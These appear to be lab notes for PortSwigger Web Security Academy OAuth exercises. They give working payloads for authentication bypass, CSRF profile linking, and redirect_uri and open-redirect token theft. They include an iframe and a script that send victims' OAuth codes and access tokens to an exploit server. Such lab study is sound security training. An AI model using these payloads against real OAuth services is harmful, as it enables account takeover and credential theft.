### Authentication bypass via OAuth implicit flow
**Payload** :
```json
{
	"email":"carlos@carlos-montoya.net",
	"username":"carlos",
	"token":"-mBe_p3eM6N9kLZY2pIaEWcjlYTpYcmu5vYumJyHP8A"
}
```
on 

### Forced OAuth profile linking
**Payload** :
since there's on state parameter on binding url `state` , it can dangereous by csrf attack, which admin will attach their account to our social media account

### OAuth account hijacking via redirect_uri
the object on this lab is to steal an auth code via `redirect_uri` parameter using CSRF attack, the payload works, because we change the value on redirect_uri, so the victim will send the request based on redirect from OAuth server
```html
Redirecting to <a href="https://0aa2001b045bfcdc9220471b0024001f.web-security-academy.net/oauth-callback?code=c00gQSAiRJN4iovUoOKfNpKzzyt2KZxbcCt73zzij3Z">https://0aa2001b045bfcdc9220471b0024001f.web-security-academy.net/oauth-callback?code=c00gQSAiRJN4iovUoOKfNpKzzyt2KZxbcCt73zzij3Z</a>.
```
```html
<iframe src="https://oauth-0a1a00ed04d9fc9f925c45a50246004a.oauth-server.net/auth?client_id=h7wj6svoqszzef5v66mfb&redirect_uri=https://exploit-0a08007504c1fc9d9209465301d6000f.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
```

### Stealing OAuth access tokens via an open redirect
it's same as before, but the redirerct_uri got whitelist, so there's another vulnerbaility on post , which is open redirect, so we can use it
```http
GET /auth?client_id=cqqzi756e6g5p21refa0l&redirect_uri=https://0a38003a04c7f87681fb70a0003d007d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0aa900cb04f1f840815c6f64012b003a.exploit-server.net/exploit/&response_type=token&nonce=-1143484154&scope=openid%20profile%20email HTTP/2
Host: oauth-0aed008604a1f85481a76edf02250050.oauth-server.net
Cookie: _session=64XCkltoQ7-3AD6KyPUGE; _session.legacy=64XCkltoQ7-3AD6KyPUGE
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0a38003a04c7f87681fb70a0003d007d.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

and on server exploit, we have to remove the fragmant
```html
<script> 
if (!document.location.hash) { 
	window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' }
else { 
	window.location = '/?'+document.location.hash.substr(1) 
} 
</script>
```

### SSRF via OpenID dynamic client registration
